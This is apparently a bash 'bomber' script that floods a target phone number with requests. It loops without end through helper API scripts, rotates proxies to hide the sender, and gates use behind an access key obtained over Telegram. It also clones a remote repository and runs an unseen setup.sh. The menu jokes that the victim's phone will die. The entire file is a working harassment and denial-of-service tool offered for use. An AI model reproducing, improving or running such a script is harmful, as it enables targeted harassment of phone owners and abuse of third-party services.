git clone "https://github.com/officialkeshav/yep"
che=$(cat yep/k.txt)
rm -rf yep
if [ -f "setup.sh" ]; then
  bash setup.sh
  rm setup.sh
fi
clear

# Function to load proxies from proxies.txt
load_proxies() {
  proxies=($(cat proxies.txt))
}

# Function to get a random proxy from the list
get_random_proxy() {
  echo "${proxies[$RANDOM % ${#proxies[@]}]}"
}

banner(){
  echo -e '\e[95m
                                                              /\
                                                             //\\\
                                                            //  \\\
                                                           //    \\\'
  echo -e '\e[91m
                                                          // --|-- \\
                                                         //  (0 0)  \\
                                                         \\_ / V \_ //
                                                            //   \\\
                                                           //     \\\'
  echo -e '\e[93m CODED BY AKCHEAT'
}

kp(){
  echo -e "\e[95m Setting Up Server"
  echo  ""
  echo -e "\e[92m[\e[91m1\e[92m]\e[93m SERVER 1\e[93m"
  echo -e "\e[92m[\e[91m2\e[92m]\e[93m SERVER 2\e[93m"
  echo -ne "\e[92mSelect Option\e[0m: \e[92m"
  read ch
  if [ $ch -eq 1 ]; then
    sp
  elif [ $ch -eq 2 ]; then
    sp1
  else
    echo -e "\e[92mWrong Option Mere Bhai"
  fi
}

sp(){
  clear
  banner
  echo -e "Start up Server"
  sleep 2.0
  echo -e "\e[95m Bombing on number :- $num"
  sleep 2.0
  echo -e "\e[91m Bombing start"

  # Get a random proxy for the request
  proxy=$(get_random_proxy)
  echo "Using proxy: $proxy"

  # Call api1.sh with the random proxy
  cp api1.sh app1.sh
  sed -i s/€tor/$num/g app1.sh
  bash app1.sh "$proxy"  # Pass the proxy as a parameter to app1.sh
  rm app1.sh
}

sp1(){
  clear
  banner
  echo -e "Start up Server"
  sleep 2.0
  echo -e "\e[95m Bombing on number :- $num"
  sleep 2.0
  echo -e "\e[91m Bombing start"

  # Get a random proxy for the request
  proxy=$(get_random_proxy)
  echo "Using proxy: $proxy"

  # Call ap.sh with the random proxy
  cp ap.sh app.sh
  sed -i s/€tor/$num/g app.sh
  bash app.sh "$proxy"  # Pass the proxy as a parameter to app.sh
  rm app.sh
}

banner
echo -e ""
echo -e '\e[93m IF YOU DONT KNOW ACCESS KEY THEN MESSAGE TELEGRAM :- @AKCHEAT'
echo -e ""
echo -ne "\e[94m ENTER YOUR ACCESS KEY :-"
read acces
if [ "$che" == "$acces" ]; then
  echo ""
  sleep 2.0
else
  sleep 2.0
  echo "wrong key"
  sleep 2.0
  bash bombing.sh
  exit
fi

sleep 3.0
clear
banner
echo  -ne "\e[91m Enter Your number :-"
read num
sleep 5.0

# Load proxies
load_proxies

# Main bombing loop
bomb(){
  clear
  banner
  sleep 2.0
  echo -e "\e[91m Starting bombing loop..."
  
  # Continuous loop for alternating between API scripts
  while true; do
    sp1  # Use ap.sh for bombing
    sleep 2  # Add a small delay between the two bombing processes
    sp   # Use api1.sh for bombing
    sleep 2
  done
}

con(){
  echo -e " "
  echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
  echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
  echo -e "\e[92m[\e[91m2\e[93m EXIT\e[93m"
  echo -e "\e[92m[\e[91m3\e[92m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
  echo -ne "select:-"
  
  read opt
  if [ $opt -eq 1 ]; then  
    bomb
  elif [ $opt -eq 2 ]; then
    clear
    exit
  elif [ $opt -eq 3 ]; then
    echo  -ne "\e[91m wrong input"
  else 
    echo  ""
  fi
}

method="true"
bomb
